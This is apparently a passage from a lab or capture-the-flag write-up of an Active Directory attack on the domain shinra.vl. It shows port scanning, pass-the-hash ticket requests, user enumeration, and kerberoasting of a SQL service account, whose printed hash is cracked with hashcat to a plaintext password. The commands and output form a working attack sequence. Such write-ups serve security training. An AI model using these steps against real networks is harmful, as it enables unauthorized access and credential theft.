As usual I will scan for possible open services on the TCP stack:

```bash
PORT      STATE SERVICE       REASON         VERSION
53/tcp    open  domain        syn-ack ttl 64 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 64 Microsoft Windows Kerberos (server time: 2026-03-25 15:29:20Z)
135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: shinra.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 64
464/tcp   open  kpasswd5?     syn-ack ttl 64
593/tcp   open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 64
3268/tcp  open  ldap          syn-ack ttl 64 Microsoft Windows Active Directory LDAP (Domain: shinra.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 64
3389/tcp  open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHINRA
|   NetBIOS_Domain_Name: SHINRA
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: shinra.vl
|   DNS_Computer_Name: dc.shinra.vl
|   DNS_Tree_Name: shinra.vl
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-25T15:30:12+00:00
|_ssl-date: 2026-03-25T15:30:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.shinra.vl
| Issuer: commonName=dc.shinra.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-05T07:08:14
| Not valid after:  2026-05-07T07:08:14
| MD5:     6fda a749 7e51 cfdf cd12 4424 fe2c 208d
| SHA-1:   57cb db41 479f 0023 ae2a 29dc b9b8 822d 4f78 e751
| SHA-256: 1278 1428 54d5 f08a 4971 edcc bd90 7506 4215 4426 e7b1 3adc f390 27b4 3b57 48d8
| -----BEGIN CERTIFICATE-----
| MIIC3DCCAcSgAwIBAgIQE2hWov/RwLdFoGPHCJreBDANBgkqhkiG9w0BAQsFADAX
| MRUwEwYDVQQDEwxkYy5zaGlucmEudmwwHhcNMjUxMTA1MDcwODE0WhcNMjYwNTA3
| MDcwODE0WjAXMRUwEwYDVQQDEwxkYy5zaGlucmEudmwwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDGFrTufEvhvJyAOccbb5pQHBExBhs00lRIP+xEHRpB
| SLNg0R8qs+QY0ctQ1ESfYHmo59PzCD8/udTgomfR+7LAzPLTsHc2joTIdu9sFuXM
| sv676xJ1N3oOX+AOLnB8/0lTjuQb3xCbq6MnHMl+f5v+PV1RwkoH0XZ4pDF5FzXo
| +ZLnDrfS11O2mIXzZDDtFukNYy7yWECT0fkGyGeCU9SV0THjZGza9bt5V+noMngL
| IyCyS9fO/lVHQsTIBTjGZAJoI4/cjY02OeSRNDXOmm5YxyHQ9new5UCIQo6YT3aJ
| fmn1tOeDA2gIPhapscBFy+w6HqlmIWxsiF+dOhZEz1uVAgMBAAGjJDAiMBMGA1Ud
| JQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEA
| PQjip2+Pw2kB0Kw2lMR4d3q/s/WLpViLQuHiHHWuaMPlUxxCggcu6Ykw92SE4TIQ
| kyXJqTWC6ayFvuvCsVC4Oyl2huRnZEGFf/8NeYVsVt6lw0/F86E1SWcqREZUJxLN
| 9le3+MWZMQcUt+mqAB355y+X1BFJTLh1qkintK0D52YyKYMGiJCunBZECC/+S8Vr
| LEZVpffhNSTOkR7LdrYGb0HzpssSMmsTsSn6X4ucxSStj0I/VMvz5stCJbtXcHo7
| IhDUURXDKN664ZXz9QdVU70AxMuUhOfnv4o20iOhXqEZLi3L6iVYr0g8zsB1nSDa
| 4IgmM3Dh47xPExEB4caxZw==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 64 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 64 Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/25%OT=53%CT=%CU=%PV=Y%G=N%TM=69C3FFAD%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 41.726 days (since Wed Feb 11 23:06:06 2026)
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# AD

With the credentials obtained by patching the trust (with Mimikatz) on the DC I can obtain my first credentials on the system:

```bash
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ impacket-getTGT -hashes :32302da7aa34caafdc2e247cc01c4690 shinra.vl/shinra-dev$
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in shinra-dev$.ccache
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ export KRB5CCNAME=/home/user/Downloads/Shinra/shinra-dev\$.ccache                                     
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ klist
Ticket cache: FILE:/home/user/Downloads/Shinra/shinra-dev$.ccache
Default principal: shinra-dev$@SHINRA.VL

Valid starting       Expires              Service principal
03/26/2026 10:45:33  03/26/2026 20:45:33  krbtgt/SHINRA.VL@SHINRA.VL
    renew until 03/27/2026 10:45:32

```

The reason I did this is because I have a one-way trust with outbound directionallity(from the DEV domain) which means I cannot use the credentials from DEV to reach back to the parent domain Shinra.vl but this last one trust DEV.

And get a list of the users on this domain:

```bash
└─$ netexec smb dc.shinra.vl --use-kcache                                        
SMB         dc.shinra.vl    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:shinra.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.shinra.vl    445    DC               [+] SHINRA.VL\shinra-dev$ from ccache 
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ netexec smb dc.shinra.vl --use-kcache --users
SMB         dc.shinra.vl    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:shinra.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.shinra.vl    445    DC               [+] SHINRA.VL\shinra-dev$ from ccache 
SMB         dc.shinra.vl    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                    
SMB         dc.shinra.vl    445    DC               Administrator                 2022-12-03 06:27:49 0       Built-in account for administering the computer/domain
SMB         dc.shinra.vl    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.shinra.vl    445    DC               krbtgt                        2022-12-06 14:34:01 0       Key Distribution Center Service Account 
SMB         dc.shinra.vl    445    DC               Josh.Manning                  2022-12-09 02:41:25 0        
SMB         dc.shinra.vl    445    DC               Mohammed.Savage               2022-12-09 02:41:25 0        
SMB         dc.shinra.vl    445    DC               Gail.Bailey                   2022-12-09 02:41:26 0        
SMB         dc.shinra.vl    445    DC               Clare.Adams                   2022-12-09 02:41:26 0        
SMB         dc.shinra.vl    445    DC               Sheila.Hargreaves             2022-12-09 02:41:26 0        
SMB         dc.shinra.vl    445    DC               Liam.Wilkinson                2022-12-09 02:41:32 0        
SMB         dc.shinra.vl    445    DC               Victor.John                   2022-12-09 02:41:32 0        
SMB         dc.shinra.vl    445    DC               Marilyn.Holden                2022-12-09 02:41:32 0        
SMB         dc.shinra.vl    445    DC               Hayley.Conway                 2022-12-09 02:41:32 0        
SMB         dc.shinra.vl    445    DC               Samuel.Clarke                 2022-12-09 02:41:32 0        
SMB         dc.shinra.vl    445    DC               Mathew.Cox                    2022-12-09 02:41:38 0        
SMB         dc.shinra.vl    445    DC               Gerald.Hall                   2022-12-09 02:41:39 0        
SMB         dc.shinra.vl    445    DC               Rosie.Roberts                 2022-12-09 02:41:39 0        
SMB         dc.shinra.vl    445    DC               Carole.Cartwright             2022-12-09 02:41:39 0        
SMB         dc.shinra.vl    445    DC               Rosie.Parker                  2022-12-09 02:41:39 0        
SMB         dc.shinra.vl    445    DC               SqlSvc                        2022-12-21 23:42:13 0        
SMB         dc.shinra.vl    445    DC               [*] Enumerated 19 local users: SHINRA

```

And seems like there is a kerberoastable serviice account(I suspect is for the SQL01 server):

```bash
└─$ netexec ldap dc.shinra.vl --use-kcache --asreproast asreproastable.txt
LDAP        dc.shinra.vl    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:SHINRA.VL) (signing:None) (channel binding:No TLS cert)
LDAP        dc.shinra.vl    389    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        dc.shinra.vl    389    DC               No entries found!
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ netexec ldap dc.shinra.vl --use-kcache --kerberoast berberoastable.txt
LDAP        dc.shinra.vl    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:SHINRA.VL) (signing:None) (channel binding:No TLS cert)
LDAP        dc.shinra.vl    389    DC               [+] SHINRA.VL\shinra-dev$ from ccache 
LDAP        dc.shinra.vl    389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.shinra.vl    389    DC               [*] Total of records returned 1
LDAP        dc.shinra.vl    389    DC               [*] sAMAccountName: SqlSvc, memberOf: [], pwdLastSet: 2022-12-22 00:42:13.586331, lastLogon: 2026-03-26 04:49:36.651092
LDAP        dc.shinra.vl    389    DC               $krb5tgs$23$*SqlSvc$SHINRA.VL$shinra.vl\SqlSvc*$0726eda9e3e7a0e640c62ff6ffb0698f$7ca1c88f8c51f893a09e51d5d640451f9bbe07ffafa3ef5f703a4b2ee52e428b5a707531a899dc4a5ad0ffbef91851c60f11fda8d4647f07208689e394ba0a5571b253e780f7dcad0c23c17995ec12545f5ada1d1be7593b48cfcf18731c5f830caea189e19c92a725cbe40969eb3955016244f7c649d151988d6f1ad221530bdf0eb0a085ad0fcb0b1fbbea7173d4e35c89f1f8a77f494f09e54c58a18636d8321d93a194474914f81770e034bddf98cc0cd47c3135949ebd49551faa1e10e389cee36beeab45e511285ffe80d662328282c88ef479a415b513b8586a303737039540bce030ae234b40e71d288f8d22ff1edefe12709a38b431633373eaabb87fb1e6ab9bcc6d363a6a10c0a8f45110104cf06d981a390068acffc455c70333892fb0634d35a47f1d61e7eca6010bdd65e0562c178c3e810f38ccbe9e5be0d654443abf63b77412ef153ec2576037fdbe5811fd0298d288b2b41374d737fbf115e9fade320fca07d7a765c80595edda5cf301fdecce22322d0725ae75dde7f90b990c056c9c32371e89a8173c308bd836f8b954006a0df31d148eab692501b8526216b2c200a7494d4b5c74b57f3d6cbc3b8d043a8ba5a830f42d9261d2995b55b1f03fe2967244d955f097306fcf6e08e022a9fcd243f8e015f9c604e0998119f068a958a5f5185823fa20cd6fb06759a1ec2550e5b80332c05d7a181fabce4332a57be6a7fb674fcd5eae420a9ee2de4cb2e74afd7b1215f67325f252b410ac458581c34eb9f531e80896b9a40aefe30604ee23455c03ab4fd451c7915ee3ce8f6b85afb174cc626e15ed82f5a8e40baf5e886c03806c12f94da0c89ed2e92ff9b6306a22a2871159a23db6b8e75895ca82c5e2b60bd5ae2c29561902b3b5794f552b04923e576f6d557fb10f56fa21a3b945dbba7c37b049c24ef7464a3002f5a89c1b0268fa3abec77e45bcd497b03ba7968e4c4dd9b7293bfe6a4bba6ac3cd613a8e4cee2ad1dcc35cd295f2b13a4e218f9ab704df3b21cf0dddcc3b9a22481c9f28a79ccca7eeda4d3f743ca53ac46ace36664eb5da8a44d93990ed04a734cd86b6044f73c4db108b0a5642a24ddb4e05fba193191d64c72304f19f5bfa7985e5c0b38aad8193b6061d903063600e0c3aa1ee930f635d7b7e5799cdc41ee4c01ff1ce8d261a688591acf5bd565141b11090bf258e5cefd0eb42f4978eef8f2a66327d268cf08f59b6481db25a93535c309a81e916af16b5db74fcb68a868016cb0b8e40914759b04c3a6b277582b3ff4049c10a654141b17524595bd99967e0d9f385110b88d3edf3c50d94e4e7ca302f9f21c78759b877df433c3142b76917c1c5c62318323edf15c4968e0ac9b6dda09648151b0430244f807b9f5e0869ae8fa5a89250b903117390349b4b8501c92627ab5c3caa2ed4dd282cc600195b300199b69773e00fc725e648055d2bd4ea1968

```

And I have the creds:

```bash
$krb5tgs$23$*SqlSvc$SHINRA.VL$shinra.vl\SqlSvc*$0726eda9e3e7a0e640c62ff6ffb0698f$7ca1c88f8c51f893a09e51d5d640451f9bbe07ffafa3ef5f703a4b2ee52e428b5a707531a899dc4a5ad0ffbef91851c60f11fda8d4647f07208689e394ba0a5571b253e780f7dcad0c23c17995ec12545f5ada1d1be7593b48cfcf18731c5f830caea189e19c92a725cbe40969eb3955016244f7c649d151988d6f1ad221530bdf0eb0a085ad0fcb0b1fbbea7173d4e35c89f1f8a77f494f09e54c58a18636d8321d93a194474914f81770e034bddf98cc0cd47c3135949ebd49551faa1e10e389cee36beeab45e511285ffe80d662328282c88ef479a415b513b8586a303737039540bce030ae234b40e71d288f8d22ff1edefe12709a38b431633373eaabb87fb1e6ab9bcc6d363a6a10c0a8f45110104cf06d981a390068acffc455c70333892fb0634d35a47f1d61e7eca6010bdd65e0562c178c3e810f38ccbe9e5be0d654443abf63b77412ef153ec2576037fdbe5811fd0298d288b2b41374d737fbf115e9fade320fca07d7a765c80595edda5cf301fdecce22322d0725ae75dde7f90b990c056c9c32371e89a8173c308bd836f8b954006a0df31d148eab692501b8526216b2c200a7494d4b5c74b57f3d6cbc3b8d043a8ba5a830f42d9261d2995b55b1f03fe2967244d955f097306fcf6e08e022a9fcd243f8e015f9c604e0998119f068a958a5f5185823fa20cd6fb06759a1ec2550e5b80332c05d7a181fabce4332a57be6a7fb674fcd5eae420a9ee2de4cb2e74afd7b1215f67325f252b410ac458581c34eb9f531e80896b9a40aefe30604ee23455c03ab4fd451c7915ee3ce8f6b85afb174cc626e15ed82f5a8e40baf5e886c03806c12f94da0c89ed2e92ff9b6306a22a2871159a23db6b8e75895ca82c5e2b60bd5ae2c29561902b3b5794f552b04923e576f6d557fb10f56fa21a3b945dbba7c37b049c24ef7464a3002f5a89c1b0268fa3abec77e45bcd497b03ba7968e4c4dd9b7293bfe6a4bba6ac3cd613a8e4cee2ad1dcc35cd295f2b13a4e218f9ab704df3b21cf0dddcc3b9a22481c9f28a79ccca7eeda4d3f743ca53ac46ace36664eb5da8a44d93990ed04a734cd86b6044f73c4db108b0a5642a24ddb4e05fba193191d64c72304f19f5bfa7985e5c0b38aad8193b6061d903063600e0c3aa1ee930f635d7b7e5799cdc41ee4c01ff1ce8d261a688591acf5bd565141b11090bf258e5cefd0eb42f4978eef8f2a66327d268cf08f59b6481db25a93535c309a81e916af16b5db74fcb68a868016cb0b8e40914759b04c3a6b277582b3ff4049c10a654141b17524595bd99967e0d9f385110b88d3edf3c50d94e4e7ca302f9f21c78759b877df433c3142b76917c1c5c62318323edf15c4968e0ac9b6dda09648151b0430244f807b9f5e0869ae8fa5a89250b903117390349b4b8501c92627ab5c3caa2ed4dd282cc600195b300199b69773e00fc725e648055d2bd4ea1968:firefly_15
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SqlSvc$SHINRA.VL$shinra.vl\SqlSvc*$072...ea1968
Time.Started.....: Thu Mar 26 10:53:08 2026 (1 sec)
Time.Estimated...: Thu Mar 26 10:53:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (Wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6595.2 kH/s (10.73ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8388608/14344385 (58.48%)
Rejected.........: 0/8388608 (0.00%)
Restore.Point....: 7864320/14344385 (54.83%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: giuli89 -> ejw378
Hardware.Mon.#01.: Temp: 50c Util: 45% Core:1815MHz Mem:5000MHz Bus:8

Started: Thu Mar 26 10:53:05 2026
Stopped: Thu Mar 26 10:53:09 2026
user@user-host:~/Downloads$ 

```

I will move to the SQL server for a moment.